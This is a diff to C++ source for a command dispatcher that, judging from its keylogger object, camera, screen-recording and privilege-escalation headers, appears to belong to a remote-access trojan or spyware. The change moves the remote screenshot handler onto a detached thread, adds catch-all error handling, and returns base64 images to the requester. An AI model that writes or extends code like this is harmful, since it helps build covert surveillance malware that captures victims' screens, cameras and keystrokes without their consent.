@@ -1,6 +1,7 @@
 #include "CommandDispatcher.hpp"
 #include "CameraCapture.h"
 #include "ScreenRecorder.h"
+#include "CaptureScreen.h"
 #include "PrivilegeEscalation.h"
 
 static Keylogger g_keylogger;
@@ -199,42 +200,54 @@ void CommandDispatcher::registerHandlers() {
     };
 
     routes_[Protocol::TYPE::SCREENSHOT] = [](const Message& msg, ResponseCallBack cb) {
-        try {
-            CaptureScreen sc;
-            std::string b64Image = sc.captureAndEncode();
-            if (b64Image.empty()) {
+        std::thread([msg, cb]() {
+            try {
+                CaptureScreen sc;
+                std::string b64Image = sc.captureAndEncode();
+                if (b64Image.empty()) {
+                    cb(Message(
+                        Protocol::TYPE::SCREENSHOT, 
+                        {
+                            {"status", "failed"},
+                            {"msg", "Captured data is empty"}
+                        },
+                        "",
+                        msg.from));
+                } else {
+                    cb(Message(
+                        Protocol::TYPE::SCREENSHOT, 
+                        {
+                            {"status", "ok"},
+                            {"mime", "image/jpeg"},
+                            {"data", b64Image},
+                            {"msg", "Screenshot captured"}
+                        }, 
+                        "", 
+                        msg.from
+                    ));
+                }
+            } catch (const std::exception& e) {
                 cb(Message(
                     Protocol::TYPE::SCREENSHOT, 
                     {
                         {"status", "failed"},
-                        {"msg", "Captured data is empty"}
-                    },
-                    "",
-                    msg.from));
-            } else {
+                        {"msg", std::string("Screenshot error: ") + e.what()}
+                    }, 
+                    "", 
+                    msg.from
+                ));
+            } catch (...) {
                 cb(Message(
                     Protocol::TYPE::SCREENSHOT, 
                     {
-                        {"status", "ok"},
-                        {"mime", "image/jpeg"},
-                        {"data", b64Image},
-                        {"msg", "Screenshot captured"}
+                        {"status", "failed"},
+                        {"msg", "Screenshot error: Unknown exception"}
                     }, 
                     "", 
                     msg.from
                 ));
             }
-        } catch (const std::exception& e) {
-            cb(Message(
-                Protocol::TYPE::SCREENSHOT, 
-                {
-                    {"status", "failed"},
-                    {"msg", std::string("Screenshot error: ") + e.what()}
-                }, 
-                "", 
-                msg.from
-            ));
-        }
+        }).detach();
     };
 
     routes_[Protocol::TYPE::CAMSHOT] = [](const Message& msg, ResponseCallBack cb) {
